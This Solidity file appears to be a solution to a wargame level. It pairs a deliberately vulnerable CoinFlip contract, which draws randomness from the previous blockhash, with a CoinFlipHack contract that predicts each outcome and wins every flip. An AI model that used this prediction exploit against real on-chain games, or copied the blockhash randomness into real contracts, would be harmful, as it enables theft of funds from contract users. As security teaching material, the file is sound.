// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts/release-v3.4/contracts/math/SafeMath.sol';

contract CoinFlipHack {
    using SafeMath for uint256;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip private coinFlip;

    constructor(address _coinFlip) public {
        coinFlip = CoinFlip(_coinFlip);
    }

    function guess() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 f = blockValue.div(FACTOR);
        bool side = f == 1 ? true : false;
        coinFlip.flip(side);
    }
}

contract CoinFlip {

    using SafeMath for uint256;
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() public {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}